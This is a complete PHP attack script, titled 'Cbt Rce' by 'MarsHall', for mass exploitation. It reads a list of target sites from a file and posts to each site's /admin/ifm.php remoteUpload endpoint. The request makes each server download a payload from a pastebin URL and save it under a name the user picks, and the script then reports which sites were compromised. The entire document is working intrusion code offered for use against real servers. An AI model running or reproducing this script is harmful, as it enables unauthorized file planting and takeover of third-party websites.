<?php

echo "\n>> Cbt Rce\n";
echo ">> Created By MarsHall\n\n";
echo ">> ";
$name = trim(fgets(STDIN));
echo "\n";

$list = file_get_contents("cbt.txt");
$open = explode("\n", $list);
foreach($open as $link){

        $bat = curl_init();
        curl_setopt($bat, CURLOPT_URL, "$link/admin/ifm.php");
        curl_setopt($bat, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($bat, CURLOPT_HEADER, 1);
        curl_setopt($bat, CURLOPT_POST, 1);
        curl_setopt($bat, CURLOPT_POSTFIELDS, "api=remoteUpload&dir=&filename=$name&method=curl&url=https://pastebin.com/raw/pcDagM2a");
        $co = curl_exec($bat);
        
    preg_match("/File successfully uploaded./", $co, $result);


    if (!empty($result)) {
    
        echo "[+] $link => File Succes Upload\n";
        echo "[~] /files/$name\n\n";
        
    } else {
    
        echo "[×] $link => Failed\n";
        
    } 
       
  }
?>
